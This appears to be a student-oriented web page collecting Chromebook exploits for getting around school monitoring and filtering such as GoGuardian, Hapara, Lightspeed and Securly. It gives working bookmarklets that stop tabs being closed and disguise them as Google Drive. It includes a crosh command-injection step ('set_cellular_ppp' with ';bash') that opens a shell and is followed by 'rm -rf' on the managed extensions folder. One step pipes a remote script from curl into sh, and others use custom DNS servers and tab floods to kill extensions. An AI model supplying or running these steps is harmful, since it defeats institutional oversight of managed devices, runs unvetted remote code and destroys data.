<h2 id="prevent-tab-close-goguardian-etc">Prevent Tab Close (GoGuardian, etc.)</h2>
<p>This is a really old exploit that originates all the way back to 2017/2018. Essentially it prevents your tab from being closed in the most simple way. Use as needed.</p>
<pre><code class="language-js">javascript: onbeforeunload = (i) =&gt; 1;
</code></pre>
<p>Paste the above in a bookmark and run it on whatever tab you want to prevent force closing!</p>
<h2 id="tab-disguise">Tab Disguise</h2>
<p>Disguises the icon and name of the tab you&#39;re on with the icon and name given in the code</p>
<p>Setup: Create a bookmark, copy the provided code and paste it in as the URL (name it whatever you want).</p>
<pre><code class="language-js">javascript: (function () {
  var link =
    document.querySelector(&quot;link[rel*=&#39;icon&#39;]&quot;) ||
    document.createElement(&quot;link&quot;);
  link.type = &quot;image/x-icon&quot;;
  link.rel = &quot;shortcut icon&quot;;
  link.href =
    &quot;https://ssl.gstatic.com/docs/doclist/images/infinite_arrow_favicon_5.ico&quot;;
  document.title = &quot;My Drive - Google Drive&quot;;
  console.log(document.title);
  document.getElementsByTagName(&quot;head&quot;)[0].appendChild(link);
})();
</code></pre>
<p>Alternatively, you can use this code to update the disguise every second (same setup)</p>
<pre><code class="language-js">javascript: function gcloak() {
  var link =
    document.querySelector(&quot;link[rel*=&#39;icon&#39;]&quot;) ||
    document.createElement(&quot;link&quot;);
  link.type = &quot;image/x-icon&quot;;
  link.rel = &quot;shortcut icon&quot;;
  link.href =
    &quot;https://ssl.gstatic.com/docs/doclist/images/infinite_arrow_favicon_5.ico&quot;;
  document.title = &quot;My Drive - Google Drive&quot;;
  console.log(document.title);
  document.getElementsByTagName(&quot;head&quot;)[0].appendChild(link);
}
gcloak();
setInterval(gcloak, 1000);
</code></pre>
<p>The 2 scripts given use a Google Drive disguise as an example, but they can be customized</p>
<ul>
<li>To change the favicon, replace the link in line 4 with your own image link</li>
<li>To change the title, replace the text in the &#39;&#39;s on line 5 with your own title</li>
<li>To change the timing, replace the number in line 9 with your own timing (in milliseconds)
ge link.href to change the favicon/logo.</li>
</ul>
<h2 id="porta-proxy-hapara">Porta Proxy (Hapara)</h2>
<p>Allows you to access a given site within other tabs; bypasses Hapara</p>
<p>Setup: Create a bookmark, copy the provided code and paste it in as the URL (name it whatever you want).</p>
<pre><code class="language-js">javascript:((function(){
var a,b,c;c=&quot;WEBSITE HERE&quot;,
b=document.createElement(&quot;iframe&quot;),
b.setAttribute(&quot;src&quot;,c),b.setAttribute(&quot;id&quot;,&quot;rusic-modal&quot;),

a=document.getElementsByTagName(&quot;body&quot;)[0],
a.appendChild(b)})).call(this)
</code></pre>
<p>To close the Porta Proxy, create another bookmark with this code:</p>
<pre><code class="language-js">javascript: var element = document.getElementById(&quot;rusic-modal&quot;); element.parentNode.removeChild(element);
</code></pre>
<p>In order to use Porta-Proxy, you must supply your own proxy website link in the bookmarklet; you put the link inside the quotation marks that read &quot;WEBSITE HERE&quot;, and you have to include https://</p>
<h2 id="permanently-remove-extensions-past-v106">Permanently Remove Extensions (Past v106)</h2>
<p>Credits: CoolElectronics</p>
<p>This exploit is currently the most flexible and effective method in TN right now as a result of the bounty made by luphoria. Criteria was to simply bypass the Enterprise Policy ArcEnabled: false but resulted in a much more effective exploit in the end.</p>
<p>This exploit details another way to permanently delete extensions. Once done, you can update or restart your chromebook and the extensions will stay gone until you powerwash.</p>
<p>You need a usb for downgrading, and rudimentary knowledge of bash is recommended.</p>
<h3 id="steps">STEPS:</h3>
<p>Downgrade to any version below 103. Instructions are in &quot;Chrome100 - Downgrade your Chrome OS&quot;.</p>
<p>Hit ctrl alt t to open a crosh window. If it’s blocked by extensions, use LTBEEF. If it’s policy blocked (“The person who set up this computer has chosen to block this site”) you can try downgrading to a version below 90, where crosh had a different URL
Type in <code class="normlcode">set_cellular_ppp \&#39;;bash;exit;\&#39;</code> and hit enter.</p>
<p>You now have access to a bash shell, logged in as chronos. More information about the permissions of this shell is at the bottom.</p>
<p>Type <code class="normlcode">rm -rf ~/Extensions/*</code>. THIS WILL BREAK EVERY EXTENSION ON YOUR CHROMEBOOK. If there are extensions you want to keep, they can be selectively removed by ID.</p>
<p>Run <code class="normlcode">chmod 000 ~/Extensions</code>. This marks the extension folder as read only, stopping it from updating in the future or any new extensions from being installed.</p>
<p>You can now restart chrome, allowing it to update to the latest version. Once rebooted onto the latest version, all removed extensions will have the default icon and won’t function at all</p>
<p><strong>If you would like Root Access, go to Root Escalation</strong></p>
<p>You can also run <code class="normlcode">set_cellular_ppp \&#39;chmod 777 ~/Extensions;rm -rf ~/Extensions;mkdir ~/Extensions;chmod 000 ~/Extensions;echo done;exit\&#39;</code> in crosh to do it all in one step</p>

<h2 id="root-escalation">Root Escalation</h2>
<p>Have the ability to run developer mode content, enable developer mode, bypass pretty much everything with one exploit. Will require the downgrade methods.</p>
<p>Has so many branches that I’m just going to link the Kajig discussion. Check the pins in the TN Discord server.</p>
<p><a href="https://discord.com/channels/419123358698045453/1033537020854800434">https://discord.com/channels/419123358698045453/1033537020854800434</a></p>
<h2 id="swamp-for-goguardian-only">[swamp] FOR GOGUARDIAN ONLY:</h2>
<p>Functions like LTBEEF, the GUI based exploit which Bypassi originally lead for disabling extensions. However unlike the Bypassi based exploit, swamp still remains unpatched on versions post v102 up to even v107.</p>
<p>This will allow you to:</p>
<ul>
<li>Disable force-installed extensions similarly to LTBEEF even on Chrome 107 where it&#39;s patched</li>
<li>Run bookmarklets on any page even when they are blocked</li>
<li>Break GoGuardian until powerwash (or until you choose to turn it back on)</li>
<li>Run a custom DNS to block network requests without actually being on a DNS</li>
<li>Run your own custom code with access to most of the chrome API</li>
</ul>

<h2 id="kiosk-exploit-de-licensed-original">KIOSK Exploit (DE-LICENSED) (Original):</h2>
<p>Although many variations of this exploit exist, this was the very original implementation of it. However, the process never went as far or flexible as a full Chrome browser window being able to be created out of this method rather than just a simple bypass within the KIOSK app.</p>
<p>Credits to B3AT and Divide for this exploit.</p>
<p>This exploit allows you to open an unrestricted Chrome instance within a kiosk app, i.e. with the kiosk user account permissions.</p>
<h3 id="steps-1">Steps:</h3>
<ul>
<li>Any kiosk app installed</li>
<li>[for v77&lt;=x&lt;=v85] OOBE/fresh install</li>
<li>Sign out</li>
<li>Turn Wi-Fi off</li>
<li>Enable ChromeVox (ctrl+alt+z)</li>
<li>Open a kiosk app</li>
<li>Spam Search+o+k (you do have to re-click o and k)</li>
<li>While spamming click &quot;Diagnose&quot;</li>
</ul>
<p>Note: The exploit should work consistently v76 or below but it&#39;s still possible to pull off on v85 or below, but only once (right after you powerwash).</p>
<h2 id="userpolicy-bypass">UserPolicy Bypass:</h2>
<p>This should enable ARC (Play Store) and unblock all <strong>policy</strong> blocked URLs.</p>
<p>When you connect to a wifi without the custom DNS the policy will reload to normal but some changes will persist, more testing is needed. This is useful because most root exploits require ARC in some form.</p>
<h3 id="you-need">You need:</h3>
<ul>
<li>The ability to downgrade to a version below 102</li>
<li>A way to access crosh. If it&#39;s blocked via extension, use LTBEEF. If it&#39;s blocked by user policy, you must use a combination of Incognito Exploit (v81) and Crosh Bypass (Daybreak)</li>
<li>A router or hotspot capable of either blocking websites via parental control or setting a custom DNS (129.213.58.41)</li>
</ul>
<h3 id="steps-2">Steps:</h3>
<ul>
<li>Downgrade to a version</li>
<li>Open crosh (ctrl+alt+t)</li>
<li>Elevate to a chronos shell by typing in set_cellular_ppp &#39;;bash;exit&#39;</li>
<li>Run the command <code class="normlcode">sh &lt;(curl -k https://coolelectronics.me/bypass.sh) &amp; disown</code></li>
<li>Remove your school account, log out or just clear it in any way you can. The method varies depending on how device policy is set up.</li>
<li>In your router settings, set the DNS to <code class="normlcode">129.213.58.41</code> or <code class="normlcode">block m.google.com</code>. (NOT THE NETWORK DNS ON THE CHROMEBOOK, IT WONT WORK; ROUTER!)</li>
</ul>
<p><strong>[EXTRAS]:</strong> personalDNSfilter and hotspot or DNS Sinkhole + Hotspot on iOS can be used; NextDNS</p>
<ul>
<li>Log into your school account</li>
</ul>
<p>Results should prompt you about a PIN and Google Play then drop you into an account where everything works as normal but no user policies are set. If you get a &quot;sign in required&quot; error, try steps again.</p>

<h2 id="unblocked-devtoolsflags-advanced">Unblocked DevTools/Flags (ADVANCED)</h2>
<p>This is a guide on how to use chrome launch options and a thread for discussing exploits related to the bash shell. I have been requested to make this several times</p>
<p>First of all, you will need some knowledge of bash, and you must know how to use vi.</p>
<p>This builds off of Permanently Remove Extensions (past v106).</p>
<p>Follow the instructions there, and stop once you have the bash shell.</p>
<ul>
<li>Run <code class="normlcode">cd ~/Downloads</code></li>
<li>Run <code class="normlcode">vi exploit.sh</code> to create a new shell file.</li>
<li>In this shell file, put the line <code class="normlcode">pkill -9 chrome</code></li>
<li>After that, head over to <code class="normlcode">chrome:version</code>, and next to &quot;command line options:&quot; copy the entire really long thing</li>
<li>Paste it into vi as a new line.</li>
</ul>
<p>Now you can add whatever launch options you want! these are like the flags in chrome:flags, but there are way more available.</p>
<p>The full list is here: <a href="https://peter.sh/experiments/chromium-command-line-switches/">https://peter.sh/experiments/chromium-command-line-switches/</a></p>
<p>Some notable ones are: <code class="normlcode">--force-devtools-available</code> (devtools), <code class="normlcode">--bwsi</code> (guest mode), <code class="normlcode">--kiosk</code>(useless but funny), <code class="normlcode">--oauth-client-id</code>(breaks policy updating and profile syncing), <code class="normlcode">--disable-extensions-except</code>, <code class="normlcode">--show-login-dev-overlay</code>/<code class="normlcode">--show-oobe-dev-overlay</code>, <code class="normlcode">--enable-hangout-services-extension-for-testing</code>(adds a bunch of useless extensions), and more.</p>
<p>To execute chrome with the launch options set, exit vi (impossible), and run <code class="normlcode">sh &lt;(cat exploit.sh) &amp; disown</code></p>
<h2 id="istealyourdns-dns">IStealYourDNS (DNS)</h2>
<p>IStealYourDNS is a TitaniumNetwork-partnered service. With it, you can seamlessly block many web filters (GoGuardian, Lightspeed, ...) and never think about bypassing filters ever again.</p>
<h3 id="installation">Installation</h3>
<p>To install it, simply open your Wi-Fi&#39;s DNS settings, and set the name servers to &quot;Custom&quot; - replace any options available with <code class="normlcode">72.5.33.65</code>. If you have multiple boxes, set the last one to <code class="normlcode">1.1.1.1</code>.</p>
<p>Then, simply restart and you&#39;re done!</p>
<h2 id="better-dns-bypass-dns">Better DNS Bypass (DNS)</h2>
<ul>
<li>Know the credentials of your School&#39;s WIFI or utilize a hotspot</li>
<li>Go to <code class="normlcode">chrome:policy</code> and Ctrl+F for <code class="normlcode">deviceopennetworkconfig</code>; click show more</li>
<li>Edit the attached ONC, changing the GUID to the guid in the policy and the security to the security in the json; same with the name, SSID, and finally change the passphrase to the password</li>
<li>Import the ONC in <code class="normlcode">chrome:network#general</code></li>
<li>Go to Wi-Fi settings as normal and the DNS shouldn&#39;t be blocked</li>

<p>This is the first Licensed exploit to be declassified as a Kajig!</p>
<p>This still needs to be improved.</p>
<p>Make sure to downgrade to chrome OS v81 or lower first: &quot;Chrome100 - Downgrade your Chrome OS&quot;</p>
<h3 id="steps-to-the-incognito-exploit-summarized">Steps to the Incognito Exploit, summarized</h3>
<p>(Steps before include getting on the login screen to the part where you are signing in as a new user. Enter your email and password but don&#39;t login. Do Alt + Shift + I. Continue to Step 1 where you spam &quot;Privacy Policy&quot;.)</p>
<ul>
<li>Follow the steps but once it gets to the &quot;Privacy Policy&quot; part, spam it for a minute or 30 seconds (until its very laggy)</li>
<li>Once you login go quickly to the Incognito Tab and do Ctrl+Shift+N</li>
<li>Do the Switch/Desktop View key and close the original Incognito Tab</li>
<li>If it continues to open policy pages, repeat Step 3.</li>
</ul>
<h3 id="benefits">Benefits:</h3>
<ul>
<li>No extensions so you won&#39;t have to worry about anything being blocked by an extension.</li>
<li>Access to a fully unrestricted YouTube.</li>
<li>Ability to sign into other google accounts. (if blocked)</li>
<li>Be able to access the majority of chrome:// urls if they were blocked by policy.</li>
<li>Get past policy blocks. (Untested fully but certain sites that were blocked by policy were unblocked for me.)</li>
<li>Use flags to further experiment with you chromebook. Applies to chrome:// urls being unblocked.</li>
<li>Access to an &quot;experimental&quot; unblocked chrome. (Called experimental as it is both restricted and not restricted.)</li>
</ul>
<h3 id="possible-errors-you-may-encounter">Possible Errors (you may encounter):</h3>
<ul>
<li>When importing an onc file, crash.</li>
<li>Don&#39;t go to chrome://os-settings or try to view Settings from the Incognito tab.</li>
<li>Restarting to modify flags will close the tab, however the effects will be applied when you restart.</li>
<li>When importing an extension (unpacked or entire crx), you will encounter the error &quot;not allowed on login screen&quot;</li>
</ul>
<p>The following exploit is still a massive WIP and the following above may be subject to change or expand.</p>
<h2 id="process-end-method">Process End Method</h2>
<ul>
<li>Open Task Manager</li>
<li>Press &#39;search&#39;+&#39;esc&#39;</li>
<li>Scroll all the way to the bottom and find your blocker extension and highlight it (click on it)</li>
<li>Click &#39;End Process&#39; it or press &#39;enter&#39;</li>
<li>Immediately go to your page and see that it&#39;s unblocked</li>
<li>This will not last unless you use this bookmarklet javascript:onbeforeunload=i=&gt;1</li>
</ul>
<p>If Task Manager is blocked:</p>
<ul>
<li>Go to <code class="normlcode">chrome-extension://</code> + your Extension ID + <code class="normlcode">/_generated_background_page.html</code></li>
<li>You can find the Extension ID by going to the puzzle piece, clicking on the 3 dots next to your filter and click manage extension and the is will be in the url</li>
<li>The link for GoGuardian is <code class="normlcode">chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/_generated_background_page.html</code></li>

<h2 id="stealth-lightspeed">Stealth (Lightspeed)</h2>
<p>This trick is specifically for when your chromebook is &quot;locked&quot; by a teacher, and any site you go to will get closed instantly. It can also hide the tab from the teachers and get around the &quot;[teacher&#39;s name] has blocked this site&quot; screen.</p>
<p>The way it works is by letting you put an iframe inside of the new tab window, where most chrome extensions don&#39;t have permission. This means that if a page is &quot;temporarily blocked&quot; by a teacher or they lock your chromebook you can still access almost every page that works in an iframe. I don&#39;t know what it shows up as on the teacher screen, but they likely will just see the new tab and not the actual site.</p>
<ul>
<li><p>Set your default search engine to bing</p>
</li>
<li><p>Open a new tab</p>
</li>
</ul>
<p>Use this bookmarklet:</p>
<pre><code class="language-js">javascript:document.write(`&lt;style&gt; iframe{margin:0px; border:none; padding:0px; outline:none} body{margin:0px}&lt;/style&gt;&lt;iframe src = &quot;${prompt(&quot;enter url&quot;)}&quot; width = ${window.innerWidth} height = ${window.innerHeight} /&gt;`)
</code></pre>
<p>Enter a url that you want to visit.</p>
<p>Notes:</p>
<ul>
<li>This only works if bookmarklets are enabled</li>
<li>Works ONLY with Lightspeed</li>

<h2 id="playstore-bypass-v106">Playstore Bypass (v106+)</h2>
<p>Make sure you are upgrading or powerwashing/recovering. Chrome Device Manager&#39;s notification should appear otherwise this will not work.</p>
<p><strong>MAKE SURE TO HAVE A HOME ACCOUNT ADDED!</strong></p>
<ul>
<li>Literally just log out/shutdown/restart when the Chrome Device Manager notif appears. LOCKING DOES NOT WORK.</li>
<li>Open PlayStore and keep it open. Try to download some apps. Fiddle around with it. Don&#39;t switch accounts as that might lock you out.</li>
</ul>
<p>Add accounts in <code class="normlcode">settings -&gt; your school account name -&gt; add account</code>. You don&#39;t need to go to Android settings and shouldn&#39;t!</p>
<p><strong>EASIER GUIDE</strong>
After Powerwash, Recovering, removing account and adding it back in:</p>
<ul>
<li>The moment <code class="normlcode">Chrome Device Manager</code> pops up ( 💼 ) do <code class="normlcode">chrome://restart</code></li>
<li>After that open Google Play and switch to your home account</li>

<p>Not everything is unbl0cked; some things will still be blocked. Either figure out how to install a VPN on Microsoft Edge or deal with it :/
If you see ERR_SSL_PROTOCOL_ERROR it probably means that you were blocked.</p>
</blockquote>
<p>For the first time, you will need to sign up. After that, everything should be simple.</p>
<h2 id="signing-up">Signing Up</h2>
<p><img src="./assets/button1.png" alt="Sign in to launch VM mode"></p>
<ol>
<li>Press that</li>
<li>Sign in with your school email</li>
<li>Microsoft will ask you a few questions. Just choose anything, it doesn&#39;t matter much.</li>
<li>Finish sign up</li>
<li>You might see a captcha. Complete it, and if it doesn&#39;t complete, just refresh.</li>
<li>Captcha should be gone and you see a button that says &quot;Launch VM mode&quot; in the same place where it said &quot;Sign in to launch VM mode&quot;</li>
</ol>

<li>In the laptop in Edge, search up &quot;Edge Addons&quot;</li>
<li>In Edge Addons, search for &quot;free VPN&quot;</li>
<li>Find a VPN and get/install the extension</li>
<li>Press the puzzle piece at the top, and press the eye next to the extension you downloaded</li>
<li>Press on the new icon that appears at the top, and then figure out what you have to do to get the VPN working. The VPN might not work, so just installing a different one.</li>
<li>Use the VPN. Some stuff might be slower but the browser will be unbl0cked.</li>
</ol>
<p>Later I might make a tutorial on fully unbl0cked Linux (like Windows) + Chrome which doesn&#39;t need a VPN and might be faster.</p>

<p>There are 3 ways to do this. The first one probably will be hard to block. The second <em>will</em> be easy to block, if you know how to do it. The third is essentially the same as the first one but with a different route. The first and third require you to know the email of another person in the IPSD district.</p>

<h2 id="important">Important:</h2>
<pre><code class="language-js">let warning = &quot;The top and bottom of the site is chopped off. The bottom can be fixed by going fullscreen. The top will always be chopped off though. That is why this exploit might be annoying.&quot;
</code></pre>
<p>Also, remember that you can use the arrow keys on your keyboard to go back and forward pages.</p>
<h2 id="method-1">Method 1</h2>
<p>If you didn&#39;t see the start, just note that you need the IPSD email of someone else (you don&#39;t need the password or anything else). If you don&#39;t have this or want to do it faster, use Method 2. Method 1 will be unblocked for a long time (I think).</p>
<ol>
<li>Go to chrome://chrome-signin</li>
<li>Put in the IPSD email</li>
<li>Press &quot;Students: I Forgot My Password&quot;</li>
<li>Press the blue &quot;Click here&quot;</li>
<li>Click on the link in the first step in the website (says &quot;Parent will visit ParentVUE at&quot; and the link)</li>
<li>Scroll and press &quot;Android App&quot;</li>
<li>At the very top right you will see a little thingy that looks like that, click it and type &quot;Google&quot;
 <br> <img style="width:200px !important;" src="./assets/search.png" alt="Search thing"></li>
<li>Choose the first one</li>
<li>Go to the &quot;Data safety&quot; section and press on &quot;See details&quot;</li>
<li>Scroll to the very bottom and click on <code class="normlcode">privacy policy</code></li>
<li>Scroll to the very bottom and press &quot;Google&quot;</li>
</ol>
<p>You are done. Now you are in Google. The only benefit of this method is that it&#39;s not gonna be blocked for some time.</p>
<h2 id="method-2">Method 2</h2>
<ol>
<li>Go to chrome://chrome-signin</li>
<li>Put in &quot;<a href="mailto:&#x67;&#x6f;&#x6f;&#x67;&#108;&#x65;&#x40;&#x64;&#x31;&#x31;&#x2e;&#x6f;&#114;&#103;">&#x67;&#x6f;&#x6f;&#x67;&#108;&#x65;&#x40;&#x64;&#x31;&#x31;&#x2e;&#x6f;&#114;&#103;</a>&quot;</li>
<li>Press &quot;Sign-in options&quot;</li>
<li>Press &quot;Sign in with GitHub&quot;</li>
<li>Press &quot;Forgot password?&quot; (YOU NEED TO DO THIS)</li>
<li>Press the GitHub cat at the top.</li>
<li>Press the search thing (top right) and type in <code class="normlcode">doxrjig</code> and press the first thing that comes up.</li>
</ol>
<p>You are done. Press on any of the links or if you have a specific link you need to get to, use the specific site switcher (don&#39;t forget https:// in front of the URL)</p>

<li>When it takes you to the log-in page, type in YOUR credentials</li>
<li>After pressing enter on the password, it should return you to a 404 page, click the google logo, it should take you to a google page. </li>
<li>This is the unblocked browser. Profit =)</li>
</ol>
<h1 id="ipsd-pass">IPSD-pass</h1>
<p>This method uses a few links in IPSD&#39;s login screen to get to a different page unblocked.</p>
<blockquote>
<p>This bypass isn&#39;t very good since you can&#39;t use the arrow keys to go back and forward in pages, and some sites like Snapchat are still blocked, but that literally can&#39;t be bypassed.</p>
</blockquote>
<p>Steps:</p>
<ol>
<li>Log out</li>
<li>You should see &quot;add a new user&quot; on the bottom left, click on that.</li>
<li>In the login screen, press &quot;Students: I Forgot My Password&quot;</li>
<li>Click the blue &quot;Click here&quot; in the sentence that says <code class="normlcode">Click here for step-by-step instructions on using this form.</code></li>
<li>You will find a sentence that says <code class="normlcode">Parent will visit ParentVUE at https://il-ipsd-psv.edupoint.com/PXP2_Login_Parent.aspx and log in with their ParentVUE username/password.</code>, click on the link (should bring you to StudentVUE)</li>
<li>Press &quot;iPhone App&quot;</li>
<li>Press on the search button (top right) and type in &quot;DuckDuckGo,&quot; you&#39;ll find a thing that says &quot;DuckDuckGo Private Browser,&quot; click on it.</li>
<li>You&#39;ll find a section that says &quot;App Privacy,&quot; and in that you&#39;ll find a link that says &quot;For more information, see the developer’s privacy policy.&quot; Click on it</li>
<li>You&#39;ll find an icon on the top left, click on it</li>
</ol>
<p>Now you are done. Use DDG like how you use Google, but remember that once you click on a site you can&#39;t go back because this exploit is bad.</p>

<p>The only problem with this is that there will be a little bit of lag while this is running. This exploit may randomly stop working, just do the entire thing again.</p>

<ol>
<li>DON&#39;T CLICK ON THIS LINK (it won&#39;t work). Instead, drag this link to your tabs, and a lot of code should pop up.</li>

<ol start="2">
<li>Press CTRL+P to bring up the printing page. Set pages to &quot;All&quot; and Layout to &quot;Landscape.&quot; Also, copy these settings down below as well. This will create a lot of lag, and you won&#39;t be able to open sites right now.</li>
</ol>
<img style="width: 300px;" src="./assets/idk.png">

<p><strong>Make sure that you copied all of those settings.</strong></p>
<ol start="3">
<li><p>Press the refresh button on your chromebook&#39;s keyboard (don&#39;t close that printing screen), then do ALT + D and ALT + Enter. There should be a new tab that opens; don&#39;t close this tab! Going on that tab is a bad idea too since it can lag you. </p>
</li>
<li><p>Copy this URL, open a new tab, and paste it in the same place you would paste a normal URL in.</p>

</ol>
<p><code class="normlcode">chrome://extensions/?id=adkcpkpghahmbopkjchobieckeoaoeem</code></p>
<ol start="5">
<li><p>Scroll down until you see <code class="normlcode">Allow access to file URLs</code> and flip the switch thing next to it, and then do it again so the switch isn&#39;t blue anymore.</p>
</li>
<li><p>If you did everything correctly, the old page closed but the new page is still open and it is still loading. Now your chromebook should be unblocked. You will feel a bit of lag but that&#39;s it. If you want to stop the exploit and go back to normal without lag, just enter <code class="normlcode">chrome://restart</code> in the place where you type URLs, and your chromebook will immediately restart.</p>

<li>Open <code class="normlcode">chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/main.js</code> in a new tab (tab 2)</li>
<li>Go to tab 2 and do CTRL + A to copy all of the code on the site.</li>
<li>Drag the code to the top (this might do a google search with all of the code, that&#39;s fine). The chromebook will freeze for a little bit.</li>
<li>Right-click on tab 1 once you stop freezing and press the duplicate button.</li>
<li>Go to tab 2 and press the switch that says &quot;Allow access to file URLs&quot; (multiple times). One of the tabs that were duplicated will close, the other won&#39;t. DON&#39;T CLOSE THE TAB THATS LOADING.</li>
<li>close the google tab, and close tab 1, and you should be unblocked!</li>
</ol>
<p>If BOTH tabs of tab 2 (the original and duplicated) close, you did something wrong probably. Just try again or something. (Unless it&#39;s patched lol)</p>

<p><strong>L</strong>iterally <strong>T</strong>he <strong>M</strong>eatiest <strong>E</strong>xploit of <strong>A</strong>ll <strong>T</strong>ime</p>
<ol>
<li>Find a page belonging to the extension you want to disable. <code class="normlcode">chrome://extensions</code>, <code class="normlcode">chrome://extensions-internals</code>, and <code class="normlcode">chrome://process-internals</code> are all good places to find your extension&#39;s ID (a 32-character lowercase string). You can also do a simple Google search. Once you have your ID, substitute it into the hostname in the URL below:</li>
</ol>
<pre><code class="normlcode">chrome-extension://extensionidhereblahblah/manifest.json
</code></pre>
<p>For some filters like Securly, the block screen is already an extension page. </p>
<ol start="2">
<li>Bookmark the extension page (bookmark A) if you wish. Then, bookmark <code class="normlcode">chrome://kill</code> (B) and <code class="normlcode">chrome://hang</code> (C). </li>
<li>On the extension page (A), click the <code class="normlcode">chrome://kill</code> bookmark (B). The page should crash. You should already have the next step prepared. </li>
<li>Instantly start spamming <code class="normlcode">chrome://hang</code> (bookmark C) and quickly reload the page while spamming (ideally with the refresh key on your keyboard or <code class="normlcode">ctrl</code>+<code class="normlcode">R</code>). You should have reloaded within one or two seconds of killing the page. </li>
<li>If the extension page (bookmark A) no longer loads, then LTMEAT worked! You can close your tabs, and the extension will be dead. If nothing loads, you probably reloaded too late or spammed too slowly. This isn&#39;t rocket science! Restart your computer to revert back to normal.</li>

<h3 id="help-me-im-an-idiot">&quot;Help me! I&#39;m an idiot!&quot;</h3>
<p>I had far too much faith in society when making this page. Some of you skids out there are really, really stupid and also can&#39;t read. So here are the answers to some commonly asked questions. </p>
<p><strong>How do I get an extension ID?</strong></p>
<p>Okay, fair. Extension IDs are leaked in a couple of places. Generally, the best way to get them is to go to extension settings and copy the URL query value.</p>
<p><strong>It says blocked by client?</strong></p>
<p>That&#39;s the message you get when you try to visit a page belonging to an extension that doesn&#39;t exist. The error message (<code class="normlcode">ERR_BLOCKED_BY_CLIENT</code>) is highly misleading. Nobody blocked it. You need to find the correct extension ID (see above).</p>
<p>If you got this because you tried to visit the <code class="normlcode">extension_id_here</code> example URL, you should be extremely ashamed of yourself. Please change and grow as a person.</p>
<p><strong>I don&#39;t have a bookmarks bar!!!!</strong></p>
<p>First, try running ctrl+shift+B. If that doesn&#39;t work, go to <code class="normlcode">chrome://settings</code> and turn on the &quot;home button&quot; feature, then set it to <code class="normlcode">chrome://hang</code>. A home icon in the top left should appear to the right of your refresh icon. Use that instead of bookmark C.</p>
<p>There is a version where you don&#39;t need bookmarklets, but I am currently gatekeeping it (L). Check this site daily to see if new alternate instructions have been posted. </p>
<p><strong>I disabled an extension, but now I can&#39;t load websites!</strong></p>
<p>If you just read the write-up, you&#39;d know this would happen if the extension&#39;s background page loaded and its listeners were already initialized before you used <code class="normlcode">chrome://hang</code>. You can double-check whether the extension is listening using <code class="normlcode">chrome://extensions-internals</code>, assuming you have a few brain cells in your head.</p>
<p>Anyway, no listeners mean you were too slow. Either you waited more than three seconds between bookmark B and reloading the page, or you needed to be spamming bookmark C faster. The most reliable fix is to restart your computer and try again. Try to match the pace of the gif below: (note the reload) </p>
<p><img src="./assets/abc.gif" alt="image"></p>
<p><strong>The bookmarks don&#39;t do anything when I click them!</strong></p>
<p>Might be admin-blocked. Either be smart enough to figure out another way or check this site daily to see if new alternate instructions have been posted.</p>
<p><strong>I disabled the extension. Why is some stuff still blocked?</strong></p>
<p>I have bad news for you... not all filters are Chrome Extensions. Again, make sure the extension pages (like bookmark A) are frozen before you assume that your skiddy self successfully did the exploit. </p>
<p><a href="https://ltmeat.bypassi.com/alt/1.txt">Baby method for slow people</a></p>

<h2 id="ltmeat-flood-freeze-extensions">LTMEAT Flood <em>Freeze extensions</em></h2>
<ol>
<li>Create a bookmark folder and paste the extension page many times. (About 800 minimum is recommended, assuming your Chromebook is average school quality) You should add the extension page at the beginning of the folder.</li>
<li>Right-click and open all in a new window.</li>
<li>Close the window with all those tabs.</li>
<li>Open the folder in a new window again, and Chrome should hang those tabs to take care of the old ones in the background that were just closed. (Equivalent to the duplicate tab step in Bypassi&#39;s method)</li>
<li>Flip the Allow access to file URLs switch in the extension settings, and then you&#39;ve bypassed the patch, and the exploit is working.</li>
</ol>
<p>Close everything and you&#39;re good to go. If it didn&#39;t work, try adjusting the number of open tabs. This is the LTMEAT Flood Method, and also unofficially called Alternate Method # 2. Enjoy a much longer life of LTMEAT!</p>
<p><strong>Not working?</strong> Ensure you open a large set, but not too large, of extension tabs (_/generated_background_page.html or /manifest.json) for a permanent freeze.</p>

<h2 id="temp-tmeat-freeze-extensions">Temp TMEAT <em>Freeze extensions</em></h2>
<p>A method of using LTMEAT that does not require <code class="normlcode">chrome://</code> URLs. This works by using 80-150 tabs to soak up memory.</p>
<ol>
<li>Create a bookmark with the link <code class="normlcode">chrome://extensions/?id=extension_id_here</code> and name it <code class="normlcode">Kill switch</code>.</li>
<li>Create a new bookmark folder. Name it <code class="normlcode">spam.js</code>. Next, paste this link into your browser: <code class="normlcode">chrome-extension://extension_id_here/background.js</code></li>
<li>Then right-click on your folder and hit <code class="normlcode">Add Page</code>. Press Enter.</li>
<li>Right-click on the folder again and hit <code class="normlcode">Bookmark Manager</code>. You should see your page. Click on it and hit <code class="normlcode">Ctrl</code>+<code class="normlcode">C</code>. Press <code class="normlcode">Ctrl</code>+<code class="normlcode">V</code> until you have 38 of them.</li>
<li>Go to a new tab and right-click your folder. Press <code class="normlcode">Open All (38)</code>.</li>
<li>Repeat step 3, then click on one of the tabs from this batch. Wait until the <code class="normlcode">This page is taking too long</code> popup appears. This will take 30-60 seconds. If it doesn’t, do <code class="normlcode">chrome://restart</code> and go back to step 2. Add 3-4 more pages to the folder.</li>
<li>Once the popup happens, right-click on one of the tabs closest to the right of the screen and hit <code class="normlcode">Duplicate</code>. Then, go to your <code class="normlcode">Kill switch</code> bookmark and look for a switch to flip, <code class="normlcode">Allow Access to File:// urls</code>. Then, click on the leftmost extension tab (one that opened from the main.js folder) and click <code class="normlcode">Close all tabs to the right</code>. KEEP THIS TAB OPEN!!!</li>
</ol>
<p>Tips: Go to <code class="normlcode">chrome://settings/performance</code> and turn Memory Saver off, and in the box where it says <code class="normlcode">Keep these sites always active</code>, paste in the extension URL. I’ve noticed clicking on one of the tabs from the second batch seems to help with reliability.</p>

<h2 id="baby-ltmeat-freeze-extensions">Baby LTMEAT <em>Freeze extensions</em></h2>
<p>BABY METHOD
FOR THE TECHNOLOGICALLY CHALLENGED.</p>
<ol>
<li>Follow step one of the original instructions to find a page belonging to the Chrome extension you want to disable.</li>
<li>Visit that <code class="normlcode">chrome-extension://extension_id_here</code> page, then type <code class="normlcode">chrome://hang</code> in the URL bar of that tab. It should start loading infinitely.</li>
<li>Right-click the tab and duplicate it. Don&#39;t close anything.</li>
<li>Go to the <code class="normlcode">chrome://extensions</code> page for the blocker extension you want to Disable.</li>
<li>If that page has any switch, such as <code class="normlcode">Allow access to file URLs</code>, click that switch. If you don&#39;t see any clickable switches, this exploit will not work</li>
